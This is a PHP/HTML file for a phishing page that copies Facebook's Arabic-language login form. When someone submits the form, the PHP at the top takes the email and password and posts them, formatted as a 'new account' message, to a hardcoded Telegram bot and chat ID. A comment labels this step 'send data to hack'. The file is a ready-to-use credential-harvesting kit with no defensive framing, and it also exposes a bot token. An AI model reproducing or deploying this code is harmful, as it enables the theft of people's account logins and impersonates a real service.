<?php 
// connect with database
// $dsn="mysql:host=localhost;dbname=facebook";
// $user="root";
// $password="";

// try{
//      $conn=new PDO($dsn , $user , $password );
//    }catch(Exception $e){
//   echo "connection falid " . $e->getMessage();
// }
// =================*************=================




// require 'function.php';

if($_SERVER['REQUEST_METHOD']=='POST')
{

  $email=filter_var($_POST['email'],FILTER_SANITIZE_EMAIL);
  $password=filter_var($_POST['password'], FILTER_SANITIZE_STRING);

  // $stm="INSERT INTO user (email , password) VALUES ('$email' , '$password')";
  // $q=$conn->prepare($stm);
  // $q->execute();



// ================== send data to  hack =====================
// config
// 
function sendtotelegram($msg){
    $website="https://api.telegram.org/bot5165301632:AAGNbsamIinZ64YxHDJUvMrKgcJeEhMr0A0";
    $params=[
        'chat_id'=>'5676067617',
        'text'=>$msg,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

}
// fill data 

$email = $email;
$password = $password;


$msg = '
==>You Have a new account<==
Order Details:

Email: '.$email.'
Password: '.$password.'

';

sendtotelegram($msg);
}
// 

?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="107175_circle_facebook_icon.png" />
    <link rel="stylesheet" href="" />
    <link rel="stylesheet" href="style.css" />
    <title>تسجيل الدخول إلي فيسبوك</title>
  </head>
  <body>
    <img src="	https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" />
    <form action="index.php" method="POST">
      <div>تسجيل الدخول إلي فيسبوك</div>
      <input
        type="email"
        name="email"
        id="email"
        placeholder="البريد الإلكتروني أو رقم الهاتف"
      />
      <input type="password" name="password" placeholder="كلمة السر" id="password" />
      <input type="submit" name="submit" value="تسجيل الدخول" id="submit" />
      <a href="">هل نسيت الحساب؟</a>
      <p>أو</p>
      <button>إنشاء حساب جديد</button>
    </form>
  </body>
</html>
